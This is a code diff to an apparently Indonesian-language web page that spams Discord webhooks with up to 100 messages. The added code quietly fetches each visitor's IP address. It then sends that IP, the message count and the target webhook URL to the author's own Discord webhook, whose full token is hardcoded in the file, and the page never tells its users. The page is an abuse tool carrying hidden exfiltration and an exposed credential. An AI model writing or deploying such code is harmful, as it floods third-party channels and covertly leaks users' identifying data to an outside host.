@@ -61,23 +61,54 @@
         <p id="status">Menunggu input...</p>
     </div>
     <script>
+        async function getIP() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error("Gagal mendapatkan IP", error);
+                return "Unknown";
+            }
+        }
+
+        async function logToDiscord(ip, count, webhook) {
+            const logWebhook = "https://discord.com/api/webhooks/1348879562997502033/xMnKC-mNZUKJDQTsICPY2OBWfvZ-dD7McfACxNEP7HRGfXPyY61uF4IfpVuIpRz2Bnyz"; // Ganti dengan webhook log Anda
+            const embed = {
+                embeds: [{
+                    title: "Log Spammer",
+                    description: `IP **${ip}** telah menggunakan spammer sebanyak **${count}** ke webhook: **${webhook}**`,
+                    color: 15158332,
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            await fetch(logWebhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(embed)
+            });
+        }
+
         async function startSpam() {
             let webhook = document.getElementById('webhook').value;
             let message = document.getElementById('message').value;
             let count = parseInt(document.getElementById('count').value);
             let mode = document.getElementById('mode').value;
             let status = document.getElementById('status');
-
+            
             if (!webhook || !message || count <= 0 || count > 100) {
                 alert("Harap isi semua kolom dengan benar! Maksimal 100 pesan.");
                 return;
             }
-
+            
             status.innerText = "Mengirim pesan...";
+            let ip = await getIP();
+            await logToDiscord(ip, count, webhook);
+            
             for (let i = 0; i < count; i++) {
                 let payload = mode === "text" ? { content: message } : {
                     embeds: [{
-                        title: "Spammer Webhooks",
+                        title: "Pesan Embed",
                         description: message,
                         color: 3447003
                     }]
